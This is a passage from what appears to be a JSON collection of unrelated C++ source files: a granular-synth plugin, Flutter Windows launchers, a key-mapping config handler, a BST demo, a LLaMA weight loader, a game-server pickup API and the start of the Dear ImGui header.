ListeStartUps::afficherMap()\n{\n\n    StartUp s5(16,\"sarra\",\"ilef\",\"xxx\",18.5,1111);\n\n    map<int,StartUp>::iterator it;\n     it = map1.find(s5.getId_startUp());\n       if (it != map1.end()) {\n\n        cout << \"la startUp avec id 16 existe\"<< endl;\n    } else {\n        cout << \"\\n Cette startUp avec id 16 n'existe pas\" << endl;\n    }\n\n    for (it=map1.begin();it!=map1.end();++it)\n    {\n\n        cout << it->first << \": \" << it->second << endl;\n        cout << \"--------------------------------------\" << endl;\n\n    }\n\n}\n\n\n",
    "#include <iostream>\n\n#include \"chugin.h\"\n\n#include \"clouds/dsp/granular_processor.h\"\n\nCK_DLL_CTOR(clds_ctor);\nCK_DLL_DTOR(clds_dtor);\nCK_DLL_MFUN(clds_setPosition);\nCK_DLL_MFUN(clds_getPosition);\nCK_DLL_MFUN(clds_setSize);\nCK_DLL_MFUN(clds_getSize);\nCK_DLL_MFUN(clds_setPitch);\nCK_DLL_MFUN(clds_getPitch);\nCK_DLL_MFUN(clds_setDensity);\nCK_DLL_MFUN(clds_getDensity);\nCK_DLL_MFUN(clds_setTexture);\nCK_DLL_MFUN(clds_getTexture);\nCK_DLL_MFUN(clds_setBlend);\nCK_DLL_MFUN(clds_getBlend);\nCK_DLL_MFUN(clds_setSpread);\nCK_DLL_MFUN(clds_getSpread);\nCK_DLL_MFUN(clds_setFeedback);\nCK_DLL_MFUN(clds_getFeedback);\nCK_DLL_MFUN(clds_setReverb);\nCK_DLL_MFUN(clds_getReverb);\nCK_DLL_MFUN(clds_setFreeze);\nCK_DLL_MFUN(clds_getFreeze);\nCK_DLL_MFUN(clds_setMode);\nCK_DLL_MFUN(clds_getMode);\n\nCK_DLL_TICKF(clds_tick);\n\nt_CKINT clds_data_offset = 0;\n\nstruct CldsData {\n\tclouds::GranularProcessor* processor;\n\tuint8_t* block_mem;\n\tuint8_t* block_ccm;\n\tclouds::PlaybackMode playback;\n\tint quality;\n\tbool freeze;\n\tint blendMode;\n};\n\nCK_DLL_QUERY(Clds) {\n\tQUERY->setname(QUERY, \"CldsP\");\n\n\tQUERY->begin_class(QUERY, \"CldsP\", \"UGen\");\n\n\tQUERY->add_ctor(QUERY, clds_ctor);\n\tQUERY->add_dtor(QUERY, clds_dtor);\n\n\tQUERY->add_ugen_funcf(QUERY, clds_tick, NULL, 1, 2);\n\n\tQUERY->add_mfun(QUERY, clds_setPosition, \"float\", \"position\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getPosition, \"float\", \"position\");\n\n\tQUERY->add_mfun(QUERY, clds_setSize, \"float\", \"size\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getSize, \"float\", \"size\");\n\n\tQUERY->add_mfun(QUERY, clds_setPitch, \"float\", \"pitch\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getPitch, \"float\", \"pitch\");\n\n\tQUERY->add_mfun(QUERY, clds_setDensity, \"float\", \"density\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getDensity, \"float\", \"density\");\n\n\tQUERY->add_mfun(QUERY, clds_setTexture, \"float\", \"texture\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getTexture, \"float\", \"texture\");\n\n\tQUERY->add_mfun(QUERY, clds_setBlend, \"float\", \"blend\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getBlend, \"float\", \"blend\");\n\n\tQUERY->add_mfun(QUERY, clds_setSpread, \"float\", \"spread\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getSpread, \"float\", \"spread\");\n\n\tQUERY->add_mfun(QUERY, clds_setFeedback, \"float\", \"feedback\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getFeedback, \"float\", \"feedback\");\n\n\tQUERY->add_mfun(QUERY, clds_setReverb, \"float\", \"reverb\");\n\tQUERY->add_arg(QUERY, \"float\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getReverb, \"float\", \"reverb\");\n\n\tQUERY->add_mfun(QUERY, clds_setFreeze, \"int\", \"freeze\");\n\tQUERY->add_arg(QUERY, \"int\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getFreeze, \"int\", \"freeze\");\n\n\tQUERY->add_mfun(QUERY, clds_setMode, \"int\", \"mode\");\n\tQUERY->add_arg(QUERY, \"int\", \"arg\");\n\tQUERY->add_mfun(QUERY, clds_getMode, \"int\", \"mode\");\n\n\tclds_data_offset = QUERY->add_mvar(QUERY, \"int\", \"@clouds_data\", false);\n\n\tQUERY->end_class(QUERY);\n\n\treturn TRUE;\n}\n\nCK_DLL_CTOR(clds_ctor) {\n\tCldsData* x = new CldsData;\n\tOBJ_MEMBER_INT(SELF, clds_data_offset) = (t_CKINT)x;\n\n\tconst int memLen = 118784;\n\tconst int ccmLen = 65536 - 128;\n\n\tx->block_mem = new uint8_t[memLen]();\n\tx->block_ccm = new uint8_t[ccmLen]();\n\tx->processor = new clouds::GranularProcessor();\n\tx->freeze = false;\n\tx->blendMode = 0;\n\tx->playback = clouds::PLAYBACK_MODE_GRANULAR;\n\tx->quality = 0;\n\n\tmemset(x->processor, 0, sizeof(*x->processor));\n\n\tx->processor->Init(x->block_mem, memLen, x->block_ccm, ccmLen);\n\n\tx->processor->set_bypass(false);\n\tx->processor->set_low_fidelity(false);\n\tx->processor->set_num_channels(2);\n\tx->processor->set_playback_mode(x->playback);\n\tx->processor->set_silence(false);\n\n\tx->processor->mutable_parameters()->density = 1.0f;\n\tx->processor->mutable_parameters()->dry_wet = 1.0f;\n\tx->processor->mutable_parameters()->feedback = 0.0f;\n\tx->processor->mutable_parameters()->freeze = false;\n\tx->processor->mutable_parameters()->pitch = -12.0f;\n\tx->processor->mutable_parameters()->position = 0.5f;\n\tx->processor->mutable_parameters()->reverb = 0.0f;\n\tx->processor->mutable_parameters()->size = 0.5f;\n\tx->processor->mutable_parameters()->stereo_spread = 0.5f;\n\tx->processor->mutable_parameters()->texture = 0.5f;\n}\n\nCK_DLL_DTOR(clds_dtor) {\n\tCldsData* x = (CldsData*)OBJ_MEMBER_INT(SELF, clds_data_offset);\n\tdelete x->processor;\n\tdelete[] x->block_mem;\n\tdelete[] x->block_ccm;\n\tdelete x;\n\tOBJ_MEMBER_INT(SELF, clds_data_offset) = 0;\n}\n\nCK_DLL_TICKF(clds_tick) {\n\tCldsData* x = (CldsData*)OBJ_MEMBER_INT(SELF, clds_data_offset);\n\n\tclouds::ShortFrame input[nframes];\n\tclouds::ShortFrame output[nframes];\n\n\tfor (int i = 0; i < nframes; i++) {\n\t\tinput[i].l = input[i].r = (short)(in[i] * 32767.0f);\n\t}\n\n\tx->processor->Prepare();\n\tx->processor->Process(input, output, nframes);\n\n\tfor (int i = 0; i < nframes; i++) {\n\t\tout[i * 2] = output[i].l / 32768.0f;\n\t\t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"simple_quize_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"macos/macos_virtual_keycodes.hpp\"\n#include \"macos_yaml_handler.hpp\"\n#include \"unix_config_setup.hpp\"\n#include \"yaml-cpp/emittermanip.h\"\n#include \"yaml_handler.hpp\"\n\n#include <chrono>\n#include <thread>\n\nint UTILS::ACTION;\nint UTILS::ALPHA;\nint UTILS::RECORD;\nint UTILS::DOWN;\nint UTILS::LEFT;\nint UTILS::RIGHT;\nint UTILS::UP;\n\nYAML::Node UTILS::ToggleKeys;\nYAML::Node UTILS::ArrowKeys;\n\nstd::optional<int> UTILS::ACTION_OPT;\nstd::optional<int> UTILS::ALPHA_OPT;\nstd::optional<int> UTILS::RECORD_OPT;\nstd::optional<int> UTILS::LEFT_OPT;\nstd::optional<int> UTILS::DOWN_OPT;\nstd::optional<int> UTILS::UP_OPT;\nstd::optional<int> UTILS::RIGHT_OPT;\n\nvoid UTILS::initialize() {\n    ToggleKeys = YamlHandler::config[\"config\"][\"Toggle Keys\"];\n    ArrowKeys = YamlHandler::config[\"config\"][\"Arrow Keys\"];\n\n    // initialize key codes\n    ACTION_OPT = KeyCodes::getKeyCode(ToggleKeys[\"Toggle Action Mode\"].as<std::string>());\n    ALPHA_OPT = KeyCodes::getKeyCode(ToggleKeys[\"Toggle Alpha Mode\"].as<std::string>());\n    RECORD_OPT = KeyCodes::getKeyCode(ToggleKeys[\"Toggle Record Mode\"].as<std::string>());\n    LEFT_OPT = KeyCodes::getKeyCode(ArrowKeys[\"Left\"].as<std::string>());\n    DOWN_OPT = KeyCodes::getKeyCode(ArrowKeys[\"Down\"].as<std::string>());\n    UP_OPT = KeyCodes::getKeyCode(ArrowKeys[\"Up\"].as<std::string>());\n    RIGHT_OPT = KeyCodes::getKeyCode(ArrowKeys[\"Right\"].as<std::string>());\n\n    // set the values of the static int variables\n    ACTION = ACTION_OPT.has_value() ? ACTION_OPT.value() : -1;\n    ALPHA = ALPHA_OPT.has_value() ? ALPHA_OPT.value() : -1;\n    RECORD = RECORD_OPT.has_value() ? RECORD_OPT.value() : -1;\n    DOWN = DOWN_OPT.has_value() ? DOWN_OPT.value() : -1;\n    LEFT = LEFT_OPT.has_value() ? LEFT_OPT.value() : -1;\n    RIGHT = RIGHT_OPT.has_value() ? RIGHT_OPT.value() : -1;\n    UP = UP_OPT.has_value() ? UP_OPT.value() : -1;\n\n    if (ACTION == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Toggle Action Mode'.\" << std::endl;\n    } else if (ALPHA == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Toggle Alpha Mode'.\" << std::endl;\n    } else if (RECORD == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Toggle Record Mode'.\" << std::endl;\n    } else if (LEFT == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Left Arrow Key'.\" << std::endl;\n    } else if (DOWN == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Down Arrow Key'.\" << std::endl;\n    } else if (UP == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Up Arrow Key'.\" << std::endl;\n    } else if (RIGHT == -1) {\n        std::cerr << \"NOT A VALID KEY-CODE FOR 'Right Arrow Key'.\" << std::endl;\n    }\n\n    std::set<std::string> valueSet;\n    bool hasDuplicate = false;\n\n    for (const auto& key : ArrowKeys) {\n        std::string value = key.second.as<std::string>();\n        if (valueSet.find(value) != valueSet.end()) {\n            hasDuplicate = true;\n            break;\n        }\n        valueSet.insert(value);\n    }\n\n    if (hasDuplicate) {\n        std::cerr << \"\\nWARNING:\" \n                  << \"\\nONE OR MORE VALUES OF THE ARROW KEYS ARE THE SAME,\" \n                  << \"\\nCONSIDER CHOOSING UNIQUE KEYS THIS. THE PROGRAM MAY NOT BEHAVE IN NORMAL WAY,\"\n                  << \"\\nCONSIDER FIXING THE CONFIGURATION.\" << std::endl;\n    }\n}\n\nvoid UTILS::updateYamlFile(const std::string& section, const std::string& key, const std::string& value) {\n\n    YAML::Node config = YamlHandler::config;\n\n    if (!config[\"config\"][section]) {\n        std::cerr << \"Section '\" << section << \"' not found in the configuration.\" << std::endl;\n        return;\n    }\n\n    if (!config[\"config\"][section][key]) {\n        std::cerr << \"Key '\" << key << \"' not found in section '\" << section << \"'.\" << std::endl; \n        return;\n    }\n\n    config[\"config\"][section][key] = value;\n\n    std::ofstream fout(ConfigSetup::config_file_address);\n    // std::ofstream fout(YamlHandler::config_file_address);\n    if (fout.is_open()) {\n        fout << \"---\\n\";\n        fout << config;\n        // fout << \"...\";\n        fout.close();\n        // std::cout << \"Updated key '\" << key << \"' in section '\" << section << \"' with value '\" << value << \"'.\" << std::endl;\n    } else {\n        // std::cerr << \"Unable to open the configuration file for writing.\" << std::endl;\n    }\n}\n",
    "#include \"MyBinarySearchTree.h\"\r\n\r\nint main()\r\n{\r\n\tMyBinarySearchTree <int>bst;\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tcout << \"Menu: \" << endl;\r\n\t\tcout << \"1. Insert a value\" << endl;\r\n\t\tcout << \"2. Print pre order\" << endl;\r\n\t\tcout << \"3. Print in order\" << endl;\r\n\t\tcout << \"4. Print post order\" << endl;\r\n\t\tcout << \"5. Search value\" << endl;\r\n\t\tcout << \"6. Search minimum value\" << endl;\r\n\t\tcout << \"7. Search maximum value\" << endl;\r\n\t\tcout << \"8. Delete a value\" << endl;\r\n\t\tcout << \"9. Exit program\" << endl;\r\n\r\n\t\tint value;\r\n\t\tint choice;\r\n\r\n\t\tcout << endl << \"Enter your option: \";\r\n\t\tcin >> choice;\r\n\r\n\t\tswitch (choice)\r\n\t\t{\r\n\t\tcase 1:\r\n\t\t\tcout << \"Enter value: \";\r\n\t\t\tcin >> value;\r\n\t\t\tbst.insertNode(value);\r\n\t\t\tcout << endl;\r\n\t\t\tbreak;\r\n\r\n\t\tcase 2:\r\n\t\t\tbst.printPreOrder();\r\n\t\t\tcout << endl;\r\n\t\t\tbreak;\r\n\r\n\t\tcase 3:\r\n\t\t\tbst.printInOrder();\r\n\t\t\tcout << endl;\r\n\t\t\tbreak;\r\n\r\n\t\tcase 4:\r\n\t\t\tbst.printPostOrder();\r\n\t\t\tcout << endl;\r\n\t\t\tbreak;\r\n\r\n\t\tcase 5:\r\n\t\t\tcout << \"Enter the value you want to search: \";\r\n\t\t\tcin >> value;\r\n\t\t\tbst.searchNode(value);\r\n\t\t\tcout << endl;\r\n\t\t\tbreak;\r\n\r\n\t\tcase 6:\r\n\t\t\tbst.minimumNode();\r\n\t\t\tbreak;\r\n\r\n\t\tcase 7:\r\n\t\t\tbst.maximumNode();\r\n\t\t\tbreak;\r\n\r\n\t\tcase 8:\r\n\t\t\tcout << \"Enter the value you want to delete: \";\r\n\t\t\tcin >> value;\r\n\t\t\tbst.deleteNode(value);\r\n\t\t\tbreak;\r\n\r\n\t\tcase 9:\r\n\t\t\tcout << \"Exiting the program.\" << endl;\r\n\t\t\tcout << endl;\r\n\t\t\treturn 0;\r\n\r\n\t\tdefault:\r\n\t\t\tcout << \"Enter number of the above given options.\" << endl;\r\n\t\t\tcout << endl;\r\n\t\t\tbreak;\r\n\r\n\t\t}\r\n\t}\r\n\r\n\treturn 0;\r\n}",
    "/*\n * This Source Code Form is subject to the terms of the Mozilla Public License, v. 2.0. If a copy of the MPL was not\n * distributed with this file, You can obtain one at https://mozilla.org/MPL/2.0/.\n */\n\n#include \"imfy/build.hpp\"\n\n#include <algorithm>\n#include <array>\n#include <string_view>\n\n#include <doctest/doctest.h>\n\nusing namespace std::string_view_literals;\n\nnamespace\n{\n\nconstexpr char to_lower(const char character)\n{\n\treturn character >= 'A' && character <= 'Z' ? static_cast<char>(character + 'a' - 'A') : character;\n}\n\nstruct is_case_insensitive_less final\n{\n\tconstexpr bool operator()(const std::string_view lhs, const std::string_view rhs) const\n\t{\n\t\treturn std::lexicographical_compare(\n\t\t\t\tlhs.cbegin(), lhs.cend(), rhs.cbegin(), rhs.cend(),\n\t\t\t\t[](const char left, const char right) { return to_lower(left) < to_lower(right); }\n\t\t);\n\t}\n\n\tconstexpr bool operator()(const imfy::build::dependency_t& lhs, const imfy::build::dependency_t& rhs) const\n\t{\n\t\treturn operator()(lhs.name, rhs.name);\n\t}\n};\n\ntemplate <typename array>\n[[nodiscard]] constexpr bool is_in_array(const array& arr, const std::string_view& str_view)\n{\n\tconst auto iterator = std::find(arr.cbegin(), arr.cend(), str_view);\n\treturn iterator != std::cend(arr) && (*iterator) == str_view;\n}\n\nconstexpr std::array compatible_licenses{\"Apache-2.0\"sv, \"BSD-2-Clause\"sv, \"BSL-1.0\"sv, \"CC0-1.0\"sv,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t \"libpng-2.0\"sv, \"MIT\"sv,\t\t\t\t\t \"MPL-2.0\"sv, \"Zlib\"sv};\n\n} // Anonymous namespace\n\nTEST_CASE(\"Test data\")\n{\n\tstatic_assert(std::is_sorted(compatible_licenses.cbegin(), compatible_licenses.cend(), is_case_insensitive_less{}));\n}\n\nTEST_CASE(\"Project information\")\n{\n\tusing namespace imfy::build;\n\n\tstatic_assert(!project.name.empty());\n\tstatic_assert(project.version.major > 0U || project.version.minor > 0U || project.version.patch > 0U);\n\tstatic_assert(project.license == \"MPL-2.0\"sv);\n\tstatic_assert(is_in_array(compatible_licenses, project.license));\n\tstatic_assert(!build_type.empty());\n}\n\nTEST_CASE(\"Compiler information\")\n{\n\tusing namespace imfy::build;\n\tstatic_assert(\n\t\t\tcompiler != compiler_id::unknown, \"Unsupported compiler. Please update the compiler metadata information.\"\n\t);\n\tstatic_assert(compiler_version.major > 0U || compiler_version.minor > 0U || compiler_version.patch > 0U);\n}\n\nTEST_CASE(\"Dependency metadata\")\n{\n\tusing namespace imfy::build;\n\n\tstatic_assert(std::size(dependencies) > 0U);\n\tstatic_assert(std::is_sorted(dependencies.cbegin(), dependencies.cend(), is_case_insensitive_less{}));\n\n\tstatic_assert(std::all_of(\n\t\t\tdependencies.cbegin(), dependencies.cend(), [](const dependency_t& dependency) -> bool\n\t\t\t{ return !dependency.name.empty() && !dependency.description.empty() && !dependency.license.empty(); }\n\t));\n\n\tstatic_assert(std::all_of(\n\t\t\tdependencies.cbegin(), dependencies.cend(), [](const dependency_t& dependency) -> bool\n\t\t\t{ return dependency.version.major != 0U || dependency.version.minor != 0U || dependency.version.patch != 0U; }\n\t));\n\n\tstatic_assert(std::all_of(\n\t\t\tdependencies.cbegin(), dependencies.cend(),\n\t\t\t[](const dependency_t& dependency) -> bool { return is_in_array(compatible_licenses, dependency.license); }\n\t));\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <string>\n#include <fstream>\n#include <tokenizers_cpp.h>\n#include <iostream>\n#include <string>\n#include \"transformer.h\"\n#include \"load8bit.h\"\n#include <chrono>\n#include <random>\n#include <omp.h>\n#include <algorithm>\n\nusing tokenizers::Tokenizer;\n\n\n// \u5b9a\u4e49\nstd::string LoadBytesFromFile(const std::string& path) {\n    std::ifstream fs(path, std::ios::in | std::ios::binary);\n    if (fs.fail()) {\n        std::cerr << \"Cannot open \" << path << std::endl;\n        exit(1);\n    }\n    std::string data;\n    fs.seekg(0, std::ios::end);\n    size_t size = static_cast<size_t>(fs.tellg());\n    fs.seekg(0, std::ios::beg);\n    data.resize(size);\n    fs.read(data.data(), size);\n    return data;\n}\n\n\n\ntensor2d LoadEmbeddingData(const std::string& path){\n    int rows = 32000, cols = 4096;\n    tensor2d result(rows, tensor1d(cols,0));\n    \n    std::ifstream file(path, std::ios::binary);\n    if (!file.is_open()) {\n        std::cerr << \"Error opening file!\" <<path <<  std::endl;\n        return {};\n    }\n    \n    float buffer;\n\n    for (size_t i = 0; i < rows; i++) {\n        for (size_t j = 0; j < cols; j++) {\n            file.read(reinterpret_cast<char*>(&buffer), sizeof(buffer));\n            result[i][j] = buffer; // Convert half to float\n        }\n    }\n\n    file.close();\n    return result;\n\n}\n\n\nstd::vector<int> TokenizerGenerator(std::string input_str){\n    // \u8f6c\u6362\u4e3atoken\u6570\u7ec4\n    std::string input_string = \"[INST] \" + input_str + \" [/INST]\";\n    auto blob = LoadBytesFromFile(\"./model_weight/tokenizer.model\");\n    auto tok = Tokenizer::FromBlobSentencePiece(blob);\n    std::vector<int> ids = tok->Encode(input_string);\n    ids.insert(ids.begin(),1);\n\n    return ids;\n}\n\n\n\n\nstd::string Detokenizer(std::vector<int> nums){\n    auto blob = LoadBytesFromFile(\"./model_weight/tokenizer.model\");\n    auto tok = Tokenizer::FromBlobSentencePiece(blob);\n    std::string decoded_prompt = tok->Decode(nums);\n    return decoded_prompt;\n}\n\n\ntensor2d Embed(const std::vector<int> & ids, const tensor2d &embedding_dict){\n    tensor2d result(0, tensor1d(embedding_dict[0].size(),0));\n    for(auto id : ids){\n        result.push_back(embedding_dict[id]);\n    }\n    return result;\n}\n\n\n\nvoid InitConfig(Config &config){\n    config.dim = 4096;\n    config.hidden_dim = 11008;\n    config.n_layers = 32;\n    config.n_heads = 32;\n    config.n_kv_heads = 32;\n    config.vocab_size = 32000;\n    config.seq_len = 4096;\n    config.temprature = 0.5;\n    config.top_p = 0.9;\n    config.bit_length = 8;\n}\n\n\n\n\nvoid ReadWeight2Vector1D(std::string filename, tensor1d &vec){\n    std::string path1 = \"/home/liyanjun/llama/llama2/llama2chatweightfp32/\" + filename;\n    std::ifstream file(path1, std::ios::binary);  // \u4ee5\u4e8c\u8fdb\u5236\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\n    if (!file) {\n        throw std::runtime_error(\"Failed to open the file. filename: \"+path1);\n    }\n    int rows = vec.size();\n    size_t numElements = rows;\n    \n    // \u521b\u5efa\u4e00\u4e2a\u4e34\u65f6 vector \u7528\u4e8e\u5b58\u50a8\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\u4e00\u7ef4\u6570\u636e\n    std::vector<float> data(numElements);\n\n    // \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u5230\u4e00\u7ef4 vector \u4e2d\n    if (!file.read(reinterpret_cast<char*>(data.data()), numElements * sizeof(float))) {\n        throw std::runtime_error(\"Failed to read the data from the file : \" + filename);\n    }\n\n    file.close();  // \u5173\u95ed\u6587\u4ef6\n    for (size_t i = 0; i < rows; ++i) {\n        vec[i] = data[i];\n    }\n}\n\nvoid ReadWeight1D8(std::string filename, tensor1d &vec){\n\n    std::ifstream file(filename, std::ios::binary);  // \u4ee5\u4e8c\u8fdb\u5236\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\n    if (!file) {\n        throw std::runtime_error(\"Failed to open the file. filename: \"+filename);\n    }\n    int rows = vec.size();\n    size_t numElements = rows;\n    \n    // \u521b\u5efa\u4e00\u4e2a\u4e34\u65f6 vector \u7528\u4e8e\u5b58\u50a8\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\u4e00\u7ef4\u6570\u636e\n    std::vector<float> data(numElements);\n\n    // \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u5230\u4e00\u7ef4 vector \u4e2d\n    if (!file.read(reinterpret_cast<char*>(data.data()), numElements * sizeof(float))) {\n        throw std::runtime_error(\"Failed to read the data from the file : \"+filename);\n    }\n\n    file.close();  // \u5173\u95ed\u6587\u4ef6\n    for (size_t i = 0; i < rows; ++i) {\n        vec[i] = data[i];\n    }\n}\n\nvoid LoadWeight32(Config &config, TransformerWeights &weights){\n\n    int head_size = config.dim / config.n_heads;\n    tensor2d(config.vocab_size, tensor1d(config.dim)).swap(weights.token_embedding_table);\n    tensor2d(config.n_layers, tensor1d(config.dim)).swap(weights.rms_att_weight);\n    tensor2d(config.n_layers, tensor1d(config.dim)).swap(weights.rms_ffn_weight);\n    tensor1d(config.dim).swap(weights.rms_final_weight);\n    tensor2d(8192,tensor1d(head_size / 2)).swap(weights.freq_cis_image);\n    tensor2d(8192,tensor1d(head_size / 2)).swap(weights.freq_cis_real);\n    tensor2d(config.n_layers, tensor1d(config.dim)).swap(weights.rms_ffn_weight);\n    tensor2d(config.vocab_size,tensor1d(config.dim)).swap(weights.wcls);\n\n    for(int i=0;i<config.n_layers;i++){\n        ReadWeight2Vector1D(\"layers.\" + std::to_string(i)+\".attention_norm.weight\",weights.rms_att_weight[i]);\n        ReadWeight2Vector1D(\"layers.\" + std::to_string(i)+\".ffn_norm.weight\",weights.rms_ffn_weight[i]);\n    }\n    ReadWeight2Vector2D(\"tok_embeddings.weight\",weights.token_embeddi",
    "/*\n * Copyright (C) 2024 AmyrAhmady (iAmir), Incognito\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"../main.h\"\n\n#include \"omp-node.hpp\"\n#include \"../core.h\"\n#include \"../utility.h\"\n\nOMPNODE_API(StreamerPickup, Create, int modelid, int type, float x, float y, float z, int worldid, int interiorid, int playerid, float streamdistance, int areaid, int priority)\n{\n\tif (core->getData()->getGlobalMaxItems(STREAMER_TYPE_PICKUP) == core->getData()->pickups.size())\n\t{\n\t\treturn INVALID_STREAMER_ID;\n\t}\n\tint pickupId = Item::Pickup::identifier.get();\n\tItem::SharedPickup pickup(new Item::Pickup);\n\tpickup->amx = nullptr; // TODO must be checked if it's used anywhere\n\tpickup->pickupId = pickupId;\n\tpickup->inverseAreaChecking = false;\n\tpickup->originalComparableStreamDistance = -1.0f;\n\tpickup->positionOffset = Eigen::Vector3f::Zero();\n\tpickup->streamCallbacks = false;\n\tpickup->modelId = modelid;\n\tpickup->type = type;\n\tpickup->position = Eigen::Vector3f(x, y, z);\n\tUtility::addToContainer(pickup->worlds, worldid);\n\tUtility::addToContainer(pickup->interiors, interiorid);\n\tUtility::addToContainer(pickup->players, playerid);\n\tpickup->comparableStreamDistance = streamdistance < STREAMER_STATIC_DISTANCE_CUTOFF ? streamdistance : streamdistance * streamdistance;\n\tpickup->streamDistance = streamdistance;\n\tUtility::addToContainer(pickup->areas, areaid);\n\tpickup->priority = priority;\n\tcore->getGrid()->addPickup(pickup);\n\tcore->getData()->pickups.insert(std::make_pair(pickupId, pickup));\n\n\tint ret = pickupId;\n\tAPI_RETURN(int ret);\n}\n\nOMPNODE_API(StreamerPickup, Destroy, int pickupid)\n{\n\tbool ret = false;\n\tstd::unordered_map<int, Item::SharedPickup>::iterator p = core->getData()->pickups.find(pickupid);\n\tif (p != core->getData()->pickups.end())\n\t{\n\t\tUtility::destroyPickup(p);\n\t\tret = true;\n\t}\n\tAPI_RETURN(bool ret);\n}\n\nOMPNODE_API(StreamerPickup, IsValid, int pickupid)\n{\n\tbool ret = false;\n\tstd::unordered_map<int, Item::SharedPickup>::iterator p = core->getData()->pickups.find(pickupid);\n\tif (p != core->getData()->pickups.end())\n\t{\n\t\tret = true;\n\t}\n\tAPI_RETURN(bool ret);\n}\n",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// 